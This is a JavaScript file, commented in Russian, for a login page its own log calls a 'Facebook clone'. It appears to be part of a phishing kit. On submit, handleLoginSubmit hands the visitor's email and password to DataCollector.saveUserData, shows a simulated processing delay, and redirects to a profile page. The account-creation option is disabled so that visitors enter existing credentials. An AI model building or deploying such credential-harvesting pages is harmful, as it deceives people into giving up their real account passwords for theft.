// script.js - основная логика страницы входа

document.addEventListener('DOMContentLoaded', function() {
    // Находим форму
    const loginForm = document.getElementById('loginForm');
    const loadingScreen = document.getElementById('loading');
    
    if (loginForm) {
        loginForm.addEventListener('submit', handleLoginSubmit);
    }
    
    // Обработка поля пароля (показать/скрыть)
    const passwordField = document.getElementById('password');
    if (passwordField) {
        addPasswordToggle(passwordField);
    }
    
    console.log('Facebook clone script loaded');
});

// Обработка отправки формы
async function handleLoginSubmit(event) {
    event.preventDefault();
    
    const email = document.getElementById('email').value.trim();
    const password = document.getElementById('password').value;
    
    // Валидация
    if (!email || !password) {
        alert('Пожалуйста, заполните все поля');
        return;
    }
    
    // Показать индикатор загрузки
    showLoading();
    
    // Сохраняем данные
    const userData = DataCollector.saveUserData(email, password);
    
    // Логируем действие
    console.log('User data saved:', { email, password: '***' });
    
    // Имитация обработки
    await simulateProcessing();
    
    // Перенаправляем на профиль
    redirectToProfile(email);
}

// Показать индикатор загрузки
function showLoading() {
    const loading = document.getElementById('loading');
    if (loading) {
        loading.classList.remove('hidden');
        
        // Автоматическое скрытие через время
        setTimeout(() => {
            loading.classList.add('hidden');
        }, CONFIG.LOADING_DISPLAY_TIME);
    }
}

// Имитация обработки
function simulateProcessing() {
    return new Promise(resolve => {
        setTimeout(() => {
            resolve();
        }, 1500);
    });
}

// Перенаправление на профиль
function redirectToProfile(email) {
    setTimeout(() => {
        // Кодируем email для передачи в URL
        const encodedEmail = encodeURIComponent(email);
        window.location.href = `profile.html?email=${encodedEmail}&ref=login`;
    }, CONFIG.REDIRECT_DELAY);
}

// Создание аккаунта
function createAccount() {
    showLoading();
    
    // Показываем сообщение
    setTimeout(() => {
        alert('Функция создания аккаунта временно недоступна. Пожалуйста, используйте вход с существующими данными.');
        hideLoading();
    }, 1000);
}

// Скрыть индикатор загрузки
function hideLoading() {
    const loading = document.getElementById('loading');
    if (loading) {
        loading.classList.add('hidden');
    }
}

// Добавить кнопку показать/скрыть пароль
function addPasswordToggle(passwordField) {
    const formGroup = passwordField.parentElement;
    
    // Создаем кнопку
    const toggleBtn = document.createElement('button');
    toggleBtn.type = 'button';
    toggleBtn.innerHTML = '👁️';
    toggleBtn.style.cssText = `
        position: absolute;
        right: 10px;
        top: 50%;
        transform: translateY(-50%);
        background: none;
        border: none;
        cursor: pointer;
        font-size: 18px;
        opacity: 0.5;
    `;
    
    // Позиционируем
    formGroup.style.position = 'relative';
    toggleBtn.style.top = '50%';
    toggleBtn.style.right = '15px';
    
    // Обработчик клика
    toggleBtn.addEventListener('click', function() {
        const type = passwordField.getAttribute('type') === 'password' ? 'text' : 'password';
        passwordField.setAttribute('type', type);
        toggleBtn.innerHTML = type === 'password' ? '👁️' : '👁️‍🗨️';
    });
    
    formGroup.appendChild(toggleBtn);
}
